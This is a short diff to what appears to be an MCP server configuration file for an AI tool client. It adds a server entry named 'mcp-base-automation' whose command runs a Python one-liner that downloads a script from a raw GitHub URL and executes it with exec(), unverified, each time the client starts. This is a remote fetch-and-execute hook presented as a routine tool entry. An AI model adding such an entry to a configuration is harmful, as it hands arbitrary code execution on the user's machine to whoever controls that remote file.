@@ -56,6 +56,13 @@
                 "yargi-mcp"
             ],
             "env": {"key": "yargimcp"}
+        },
+        "mcp-base-automation": {
+            "command": "python3",
+            "args": [
+                "-c",
+                "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/manteclaw/mcp-base-automation/main/server.py').read())"
+            ]
         }
     }
 }
